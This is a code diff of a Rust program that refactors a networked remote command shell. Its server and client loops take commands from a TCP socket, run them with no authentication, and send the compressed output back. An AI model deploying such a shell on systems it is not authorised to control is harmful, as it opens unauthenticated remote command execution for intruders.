@@ -1,13 +1,14 @@
 extern crate mio;
 extern crate flate2;
 
+
 use mio::*;
-use mio::tcp::*;
+use mio::net::*;
 use flate2::Compression;
 use flate2::write::ZlibEncoder;
 use std::collections::HashMap;
 use std::io::{BufRead, BufReader, Write};
-use std::net::Ipv4Addr;
+use std::net::{Ipv4Addr, Shutdown};
 use std::env;
 use std::process::{Stdio, Command, exit};
 
@@ -73,6 +74,18 @@ fn parse_options() -> EnvOptions {
     env_options
 }
 
+fn execute_command(command_split: Vec<&str>) -> Result<String, std::io::Error> {
+    let command_output = Command::new(command_split[0])
+                     .stdout(Stdio::piped())
+                     .stderr(Stdio::piped())
+                     .args(&command_split[1..])
+                     .output()?;
+    println!("Proc_result: {:?}", command_output);
+    println!("Status: {}", command_output.status.success());
+
+    Ok(String::from_utf8_lossy(&command_output.stdout).to_string())
+}
+
 fn command_loop_server(sockets: &mut ServerConnections, poll: &Poll, mut pevents: &mut Events){
     loop {
         poll.poll(&mut pevents, None).unwrap();
@@ -109,17 +122,17 @@ fn command_loop_server(sockets: &mut ServerConnections, poll: &Poll, mut pevents
                         }
                     };
 
-                    println!("Recv'd {}: {}", read_buf, command);
+                    println!("Recv, length {}: {}", read_buf, command);
 
                     if command.trim() == "kill" {
                         exit(0);
                     }
 
-                    if command.trim() == "exit" {
+                    if command.trim() == "quit" {
                         let _ = client.shutdown(Shutdown::Both);
                         sockets.token_counter -= 1;
                         let _ = poll.deregister(client);
-                        println!("[+] Exiting...");
+                        println!("[+] Client disconnect...");
                         break;
                     }
 
@@ -128,51 +141,22 @@ fn command_loop_server(sockets: &mut ServerConnections, poll: &Poll, mut pevents
                         continue;
                     }
 
-                    let proc_result = Command::new(comm_split[0])
-                                         .stdout(Stdio::piped())
-                                         .stderr(Stdio::piped())
-                                         .args(&comm_split[1..])
-                                         .output();
-                    println!("{:?}", proc_result);
+                    let command_output = execute_command(comm_split);
 
-                    let output = match proc_result {
-                        Ok(r) => r,
-                        Err(_) => {
-                            let _ = send_client.write("No such file or directory".as_bytes());
-                            continue;   
-                        },
-                    };
+                    let command_output = 
+                        if command_output.is_ok() {
+                            command_output.unwrap()
+                        } else {
+                            command_output.unwrap_err().to_string()
+                        };
 
-                    println!("Status: {}", output.status.success());
-                    if output.status.success() {
-                        let mut e = ZlibEncoder::new(Vec::new(), Compression::Default);
-                        let compressed_bytes_len = e.write(&output.stdout[..]).unwrap();
-                        let compressed_bytes = e.finish().unwrap();
-                        println!("Compressed len: {}", compressed_bytes.len());
-                        println!("Orig len: {}", output.stdout.len());
-                        println!("Sending: {:?}", compressed_bytes);
-                        let _ = send_client.write(&compressed_bytes[..]);
-
-                        /* Without compression 
-                        let output_string = String::from_utf8(output.stdout).unwrap();
-                        println!("Output: {}", output_string);
-                        let _ = send_client.write(&output_string.as_bytes());
-                        */
-                        continue;
-                    }
-
-                    let mut e = ZlibEncoder::new(Vec::new(), Compression::Default);
-                    let compressed_bytes_len = e.write(&output.stderr[..]).unwrap();
+                    let mut e = ZlibEncoder::new(Vec::new(), Compression::default());
+                    let _compressed_bytes_len = e.write(command_output.as_bytes()).unwrap();
                     let compressed_bytes = e.finish().unwrap();
                     println!("Compressed len: {}", compressed_bytes.len());
-                    println!("Orig len: {}", output.stdout.len());
-                    println!("Sending: {:?}", compressed_bytes);
+                    println!("Orig len: {}", command_output.len());
+                    //println!("Sending: {:?}", compressed_bytes);
                     let _ = send_client.write(&compressed_bytes[..]);
-                    /* Without compression
-                    let output_string_stderr = String::from_utf8(output.stderr).unwrap();
-                    println!("Stderr: {}", output_string_stderr);
-                    let _ = send_client.write(&output_string_stderr.as_bytes());
-                    */
 
                 }
             }
@@ -200,14 +184,14 @@ fn command_loop_client(poll: Poll, mut pevents: Events, client_sock: &TcpStream)
             }
         };
 
-        println!("Recv'd {}: {}", read_buf, command);
+        println!("Recv, Length {}: {}", read_buf, command);
 
         if command.trim() == "kill" {
             exit(0);
         }
 
-        if command.trim() == "exit" {
-            println!("[+] Exiting...");
+        if command.trim() == "quit" {
+            println!("[+] Disconnecting...");
             exit(0);
         }
 
@@ -217,34 +201,22 @@ fn command_loop_client(poll: Poll, mut pevents: Events, client_sock: &TcpStream)
         }
 
         println!("Running {:?}", comm_split);
-        let proc_result = Command::new(comm_split[0])
-                                  .stdout(Stdio::piped())
-                                  .stderr(Stdio::piped())
-                                  .args(&comm_split[1..])
-                                  .output();
-        println!("{:?}", proc_result);
+        let command_output = execute_command(comm_split);
 
-        let output = match proc_result {
-            Ok(r) => r,
-            Err(_) => {
-                let _ = send_client.write("No such file or directory".as_bytes());
-                continue;   
-            },
-        };
-        
-        println!("Status: {}", output.status.success());
-        if output.status.success() {
-            let output_string = String::from_utf8(output.stdout).unwrap();
-            println!("Output: {}", output_string);
-            let _ = send_client.write(&output_string.as_bytes());
-            continue;
-        }
+        let command_output = 
+            if command_output.is_ok() {
+                command_output.unwrap()
+            } else {
+                command_output.unwrap_err().to_string()
+            };
 
-        let output_string_stderr = String::from_utf8(output.stderr).unwrap();
-        println!("Stderr: {}", output_string_stderr);
-        let _ = send_client.write(&output_string_stderr.as_bytes());
-    
-        }
+        let mut e = ZlibEncoder::new(Vec::new(), Compression::default());
+        let _compressed_bytes_len = e.write(command_output.as_bytes()).unwrap();
+        let compressed_bytes = e.finish().unwrap();
+        println!("Compressed len: {}", compressed_bytes.len());
+        println!("Orig len: {}", command_output.len());
+        //println!("Sending: {:?}", compressed_bytes);
+        let _ = send_client.write(&compressed_bytes[..]);
     }
 
 fn main () {
